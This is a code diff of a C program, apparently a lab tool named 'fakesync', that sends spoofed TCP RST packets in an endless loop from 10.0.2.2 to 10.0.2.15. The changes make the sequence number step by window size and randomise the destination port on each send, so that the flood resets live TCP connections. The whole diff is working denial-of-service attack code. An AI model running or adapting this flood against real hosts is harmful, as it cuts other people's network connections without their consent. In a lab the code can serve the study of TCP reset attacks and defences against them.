@@ -64,11 +64,11 @@ int main(int argc, char *argv[])
     char *srcIP = "10.0.2.2";
     char *dstIP = "10.0.2.15";
     uint16_t srcPort = 35801;
-    uint16_t dstPort = 35801;
+    uint16_t dstPort = 1025;
     uint32_t seq0 = 0;
-    uint32_t ack0 = 322274747;
-    uint16_t id0 = 56;
-    uint16_t window_size = 8192;
+    uint32_t ack0 = 0;
+    uint16_t id0 = rand() %(65536);
+    uint16_t win = 8192;
     size_t tcp_len;
     void *data;
     struct sockaddr_in sa;
@@ -124,7 +124,7 @@ int main(int argc, char *argv[])
     tcph -> rst = 1;
     tcph -> syn = 0;
     tcph -> fin = 0;
-    tcph -> window = htons(window_size); // 16 bits
+    tcph -> window = htons(win); // 16 bits
     tcph -> check = 0; // 16 bits. init to 0.
     tcph -> urg_ptr = 0; // 16 bits. indicates the urgent data, if URG flag is set
     
@@ -144,16 +144,15 @@ int main(int argc, char *argv[])
     // flood RST
     while(1)
     {
-        // tcph -> seq = htonl(seq0++); // set seq number
-        // cstcph -> seq = htonl(seq0); // set seq number in the checksum header
-        tcph -> ack_seq = htonl(ack0++); // set ack seq number
-        cstcph -> ack_seq = htonl(ack0); // set ack seq number in the checksum header
-        tcph -> check = 0; // reset check sum
-        cstcph -> check = 0; // reset check sum
-        dstPort = htons(rand() %(65535+1-1024)+1024);
         tcph -> dest = htons(dstPort);
         cstcph -> dest = htons(dstPort);
-        tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len);
+        tcph -> seq = htonl(seq0); // set seq number
+        cstcph -> seq = htonl(seq0); // set seq number in the checksum header
+        // tcph -> ack_seq = htonl(ack0++); // set ack seq number
+        // cstcph -> ack_seq = htonl(ack0); // set ack seq number in the checksum header
+        tcph -> check = 0; // reset check sum
+        cstcph -> check = 0; // reset check sum  
+        tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len); // calculate check sum
 
         // build sockaddr
         sa.sin_family = AF_INET;
@@ -165,6 +164,9 @@ int main(int argc, char *argv[])
             perror("fakesync: sendto()\n");
         }
         // break;
+
+        seq0 += win; // increment sequence by window size
+        dstPort = htons(rand() %(65535+1-1024)+1024); // pick another random destination port
     }
 
     return 0;
